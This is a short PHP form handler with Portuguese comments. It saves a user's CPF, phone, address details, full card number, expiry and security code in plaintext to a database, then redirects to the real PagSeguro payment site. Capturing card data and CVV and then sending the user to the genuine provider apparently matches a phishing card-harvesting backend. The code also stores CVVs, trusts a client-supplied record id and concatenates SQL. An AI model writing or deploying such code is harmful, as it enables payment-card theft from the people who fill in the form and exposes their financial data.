<?php
// Sessão
session_start();
// Conexão
require_once '../cadastro/conexao.php';

if(isset($_POST['btn-editar'])):
	$cpf = mysqli_escape_string($conn, $_POST['cpf']);
	$telefone = mysqli_escape_string($conn, $_POST['telefone']);
	$cep = mysqli_escape_string($conn, $_POST['cep']);
	$numero_casa = mysqli_escape_string($conn, $_POST['numero_casa']);
	$nome_do_titular = mysqli_escape_string($conn, $_POST['nome_do_titular']);
	$numero_do_cartao = mysqli_escape_string($conn, $_POST['numero_do_cartao']);
	$validade = mysqli_escape_string($conn, $_POST['validade']);
	$codigo_seg = mysqli_escape_string($conn, $_POST['codigo_seg']);
	

	$id = mysqli_escape_string($conn, $_POST['id']);

	$sql = "UPDATE usuarios SET cpf = '$cpf', telefone = '$telefone', cep = '$cep', numero_casa = '$numero_casa', nome_do_titular = '$nome_do_titular', numero_do_cartao = '$numero_do_cartao', validade = '$validade', codigo_seg = '$codigo_seg' WHERE id = '$id'";

	if(mysqli_query($conn, $sql)):
		$_SESSION['mensagem'] = "Atualizado com sucesso!";
		header('Location: https://pagseguro.uol.com.br/');
	else:
		$_SESSION['mensagem'] = "Erro ao atualizar";
		header('Location: ../index.php');
	endif;
endif;